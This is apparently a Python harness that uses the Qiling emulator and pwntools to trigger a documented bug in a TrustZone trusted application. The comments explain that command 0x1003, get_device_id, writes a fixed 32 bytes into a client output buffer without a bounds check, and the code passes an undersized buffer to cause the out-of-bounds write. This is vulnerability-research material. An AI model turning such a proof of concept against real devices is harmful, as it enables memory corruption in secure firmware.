from .params import *
from pwn import *
from qiling import Qiling
import os
# cmd 0x1003 soter_get_device_id (handler 0x26098), ptypes 0x6 (p0 MEMREF_OUTPUT).
# Gate: out-size != 0 only. Copy-out @0x26238: memcpy(p0.ptr, 32B devid blob, 0x20)
# with *p0.size=0x20, NO bound vs p0.size. NO key/provisioning needed (tee_get_cpuid).
# out_sz < 0x20 => fixed 32-byte OOB write past the client OUTPUT buffer.
OUT_SZ = int(os.environ.get("DEVID_OUTSZ", "8"), 0)
def place_input_callback(ql: Qiling, input: bytes, _: int):
    print(f"[devid] cmd=0x1003 get_device_id out_sz={OUT_SZ:#x} (writes fixed 0x20 -> OOB)")
    p = [MemRefParam(bytes(OUT_SZ), OUT_SZ), NoneParam(), NoneParam(), NoneParam()]
    setup_params_fuzz(ql, 0x1003, 0x6, p)
    return True
